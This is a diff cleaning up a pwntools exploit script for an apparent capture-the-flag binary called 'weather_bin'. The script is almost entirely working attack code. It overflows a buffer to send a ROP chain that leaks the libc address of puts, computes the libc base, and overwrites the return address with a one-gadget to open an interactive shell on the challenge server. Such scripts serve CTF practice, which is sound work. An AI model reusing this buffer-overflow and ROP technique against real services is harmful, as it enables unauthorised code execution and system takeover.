@@ -3,7 +3,6 @@ from pwn import *
 pwnable = './weather_bin'
 
 elf = ELF(pwnable)
-#libc = ELF('./libc6_2.27-3ubuntu1_amd64.so')
 libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')
 
 context(terminal=['tmux', 'new-window'])
@@ -11,7 +10,6 @@ context(os = 'linux', arch = 'amd64')
 
 context.log_level = 'DEBUG'
 
-#setarch $(uname -m) -R /bin/bash
 debug_set = ''
 
 debug_set_1 = '''
@@ -58,14 +56,9 @@ if len(sys.argv) > 2 and sys.argv[1] == 'debug':
     p = process(pwnable)
     gdb.attach(p, debug_set_3)
 elif len(sys.argv) > 1 and sys.argv[1] == 'debug':
-    #p = process("./seethefile", env=env)
-    #gdb.attach(p, debug_set_1)
     p = process(pwnable, aslr=True)
     gdb.attach(p, debug_set_4)
 else:
-    #p = process('./seethefile')
-    #env = {"LD_PRELOAD": os.path.join(os.getcwd(), "/root/libc_32.so.6")}
-    #p = process(pwnable, aslr=True)
     p = remote('challs.xmas.htsp.ro', 12002)
 
 
@@ -86,19 +79,7 @@ text_header = dynamic_elf.read(dynamic_elf.get_section_by_name('.text').header.s
 header = u64(text_header[32:35] + "\x00\x00\x00\x00\x00")
 
 buffer_size = dynamic_elf.read(header, 9)
-#buffer_size = dynamic_elf.read(u64(text_header[32:35] + "\x00\x00\x00\x00\x00"), 550)
-#print("buffer_size[7:9]" + buffer_size[7:9])
-#print("buffer_size[7:9]" + buffer_size[759:762])
 
-#buffer_size = hex(u64(buffer_size[7:9] + "\x00\x00\x00\x00\x00\x00"))
-#buffer_size = hex(u64(buffer_size[708:710] + "\x00\x00\x00\x00\x00\x00"))
-#buffer_size = buffer_size[500:550]
-
-#blah2 = u64(text_header[32:35] + "\x00\x00\x00\x00\x00") - 0x000003a7
-
-#buffer_size = dynamic_elf.read(blah2,8)
-
-#IF rbp-0xd THEN sub rsp, 0xb0
 print("buffer_size :: " + hex(u64(buffer_size[7:9] + "\x00\x00\x00\x00\x00\x00")))
 
 print("dynamic_elf.read(0x00403752, 10) :: " + hex(u64(text_header[32:35] + "\x00\x00\x00\x00\x00" )))
@@ -106,10 +87,9 @@ dynamic_rop_chain = ROP(dynamic_elf)
 
 dynamic_rop_chain.call(dynamic_elf.plt['puts'], [dynamic_elf.got['puts']])
 
-#print("dynamic_elf.plt['puts'] :: " + hex(dynamic_elf.plt['puts']))
-#print("(int(buffer_size, 16)-48) :: " + hex(int(buffer_size, 16)-48))
 
-
+#I used this loop to stall while I disasbelmed the binary and get the offset,
+#super hacky but it worked lol :D
 for i in range(20):
     print (str(i) + "seconds left")
     time.sleep(1.0)
@@ -122,9 +102,7 @@ buffer_size = (int(buffer_size, 16) + 8)
 
 print("buffer_size :: " + str(buffer_size))
 
-#p.sendline("aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaab"  +  p64(0x00403ac3) + p64(0x605018) + p64(0x4005c0) + p64(0x004035f3))
 p.sendline("A"*buffer_size + str(dynamic_rop_chain) + p64(header))
-#p.recvuntil("bye!\n")
 p.recvuntil("!\n")
 p.recvuntil("!\n")
 blah = p.recv(6) + "\x00\x00"
@@ -140,16 +118,12 @@ print("system :: " + hex(libc.sym['system']))
 
 rop_chain = ROP(pwnable)
 rop_chain.call(libc.sym['system'], [bin_shell])
-#rop_chain.call(libc.sym['system'], ['cat flag'])
 
 p.recvuntil("? ")
 
-#p.sendline("aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaab"  +  str(rop_chain))
 p.sendline("A"*buffer_size  +  p64(libc_base + 0x10a38c))
 
 
 p.recvline()
 p.recvline()
-#p.recvuntil("ing...\n")
-#p.wait_for_close()
 p.interactive()
